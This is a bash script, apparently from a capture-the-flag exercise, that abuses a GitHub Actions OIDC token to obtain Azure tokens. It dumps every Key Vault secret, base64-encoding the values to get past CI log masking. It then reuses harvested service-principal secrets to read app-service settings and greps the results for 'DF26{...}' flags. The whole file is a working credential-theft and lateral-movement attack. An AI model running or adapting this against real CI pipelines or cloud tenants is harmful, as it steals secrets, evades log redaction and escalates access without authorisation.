#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-prod-x3euoz
SITE=app-tbl-reporting-prod
KV=https://kv-tbl-prod-x3euoz.vault.azure.net
jq_(){ python3 -c "import sys,json;d=json.load(sys.stdin);print($1)"; }

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq_ 'd["value"]')
fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d client_id=$AZURE_CLIENT_ID -d grant_type=client_credentials -d scope=$1 \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode client_assertion=$OIDC | jq_ 'd.get("access_token","")'; }
sptok(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d client_id=$1 -d grant_type=client_credentials -d scope=https://management.azure.com/.default \
  --data-urlencode client_secret=$2 | jq_ 'd.get("access_token","")'; }
appset(){ curl -sS -X POST -H "Authorization: Bearer $1" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE/config/appsettings/list?api-version=2022-03-01"; }

VT=$(fed "https://vault.azure.net/.default")
ARM_CI=$(fed "https://management.azure.com/.default")

echo "=== KV secrets (base64 = bypass mask) ==="
NAMES=$(curl -sS -H "Authorization: Bearer $VT" "$KV/secrets?api-version=7.4" | python3 -c 'import sys,json;[print(x["id"].rstrip("/").split("/")[-1]) for x in json.load(sys.stdin).get("value",[])]')
for n in $NAMES; do
  v=$(curl -sS -H "Authorization: Bearer $VT" "$KV/secrets/$n?api-version=7.4" | jq_ 'd.get("value","")')
  echo "KVB64 $n = $(printf '%s' "$v" | base64 -w0)"
done

echo "=== appsettings via CI OIDC identity ==="
appset "$ARM_CI"; echo

echo "=== appsettings via each harvested SP ==="
for n in $NAMES; do
  j=$(curl -sS -H "Authorization: Bearer $VT" "$KV/secrets/$n?api-version=7.4" | jq_ 'd.get("value","")')
  aid=$(printf '%s' "$j" | jq_ 'd.get("appId","")' 2>/dev/null)
  sec=$(printf '%s' "$j" | jq_ 'd.get("clientSecret","")' 2>/dev/null)
  [ -z "$aid" ] && continue
  t=$(sptok "$aid" "$sec")
  echo "--- $n ($aid):"; appset "$t"; echo
done

echo "=== FLAG SCAN ==="
{ appset "$ARM_CI"; for n in $NAMES; do j=$(curl -sS -H "Authorization: Bearer $VT" "$KV/secrets/$n?api-version=7.4" | jq_ 'd.get("value","")'); aid=$(printf '%s' "$j"|jq_ 'd.get("appId","")' 2>/dev/null); sec=$(printf '%s' "$j"|jq_ 'd.get("clientSecret","")' 2>/dev/null); [ -n "$aid" ] && appset "$(sptok "$aid" "$sec")"; done; } | grep -oE 'DF26\{[^"]*\}' | sort -u
echo "ENUM2_COMPLETE"